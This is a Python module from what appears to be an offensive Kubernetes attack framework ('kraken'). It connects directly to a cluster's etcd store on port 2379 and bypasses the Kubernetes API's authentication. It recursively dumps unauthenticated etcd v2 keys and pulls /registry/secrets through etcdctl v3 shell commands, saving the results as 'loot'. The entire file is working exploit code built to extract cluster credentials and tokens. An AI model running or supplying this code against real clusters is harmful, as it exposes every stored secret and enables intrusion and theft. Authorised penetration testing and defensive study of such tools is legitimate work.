"""Direct etcd access to extract all cluster secrets without K8s API auth."""

from __future__ import annotations

import socket
import subprocess
from typing import Any

from kraken.logger import log
from kraken.models import AttackResult, EngagementContext
from kraken.modules.base import BaseModule

try:
    import requests
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    requests = None  # type: ignore[assignment]
    HAS_REQUESTS = False

ETCD_PORT = 2379


class EtcdModule(BaseModule):
    """Direct etcd access to extract all cluster secrets without K8s API auth."""

    name = "etcd"

    def run(self, ctx: EngagementContext, **kwargs: object) -> list[AttackResult]:
        etcd_host: str = str(kwargs.get("etcd_host", ""))
        cert_dir: str = str(kwargs.get("cert_dir", ""))

        results: list[AttackResult] = []
        host = etcd_host or ctx.api_host
        if not host:
            return [AttackResult("etcd", "config", "FAILED", notes="Specify --etcd-host or --api-host")]

        # 1. Check if etcd port is open
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, ETCD_PORT))
            s.close()
            log(f"[Etcd] Port {ETCD_PORT} open on {host}", "OK")
        except Exception:
            return [
                AttackResult("etcd", "port_check", "FAILED", notes=f"etcd port {ETCD_PORT} not accessible on {host}")
            ]

        # 2. Try unauthenticated HTTP (etcd v2 API)
        if HAS_REQUESTS:
            results.extend(self._etcd_v2_dump(ctx, host))
            results.extend(self._etcd_v3_check(ctx, host, cert_dir))

        return results

    def _etcd_v2_dump(self, ctx: EngagementContext, host: str) -> list[AttackResult]:
        try:
            # etcd v2 HTTP API (no auth by default in older clusters)
            resp = requests.get(f"http://{host}:{ETCD_PORT}/v2/keys/?recursive=true", timeout=10, verify=False)
            if resp.status_code == 200:
                data = resp.json()
                log("[Etcd] Unauthenticated etcd v2 accessible! Dumping all keys...", "CRIT")
                # Extract K8s secrets
                k8s_secrets: list[dict[str, str]] = []
                self._recurse_etcd_keys(data.get("node", {}), k8s_secrets)
                ctx.loot["etcd_v2_dump"] = k8s_secrets[:50]
                return [
                    AttackResult(
                        "etcd",
                        "v2_dump",
                        "SUCCESS",
                        severity="CRITICAL",
                        data={"keys_found": len(k8s_secrets)},
                        notes=f"Etcd v2 unauthenticated! {len(k8s_secrets)} keys exposed. All K8s secrets accessible.",
                    )
                ]
        except Exception:
            pass
        return [AttackResult("etcd", "v2_probe", "INFO", notes="etcd v2 not accessible or requires auth")]

    def _recurse_etcd_keys(self, node: dict[str, Any], results: list[dict[str, str]]) -> None:
        if "value" in node:
            results.append({"key": node.get("key", ""), "value": node.get("value", "")[:200]})
        for child in node.get("nodes", []):
            self._recurse_etcd_keys(child, results)

    def _etcd_v3_check(self, ctx: EngagementContext, host: str, cert_dir: str) -> list[AttackResult]:
        # etcd v3 uses gRPC -- check via etcdctl if available
        etcdctl = (
            "etcdctl"
            if not cert_dir
            else f"etcdctl --cacert={cert_dir}/ca.crt --cert={cert_dir}/server.crt --key={cert_dir}/server.key"
        )
        try:
            proc = subprocess.run(
                f"ETCDCTL_API=3 {etcdctl} --endpoints=https://{host}:{ETCD_PORT} get / --prefix --keys-only 2>&1 | head -50",
                shell=True,
                capture_output=True,
                text=True,
                timeout=10,
            )
            if proc.returncode == 0 and "/registry/" in proc.stdout:
                log("[Etcd] etcdctl v3 accessible!", "CRIT")
                # Get K8s secrets
                proc2 = subprocess.run(
                    f"ETCDCTL_API=3 {etcdctl} --endpoints=https://{host}:{ETCD_PORT} get /registry/secrets --prefix 2>&1 | head -200",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=15,
                )
                ctx.loot["etcd_v3_secrets_raw"] = proc2.stdout[:2000]
                return [
                    AttackResult(
                        "etcd",
                        "v3_dump",
                        "SUCCESS",
                        severity="CRITICAL",
                        data={"output": proc2.stdout[:500]},
                        notes="etcd v3 accessible via etcdctl. All K8s secrets exposed.",
                    )
                ]
        except Exception:
            pass
        return [AttackResult("etcd", "v3_probe", "INFO", notes="etcd v3 not accessible without valid certs")]
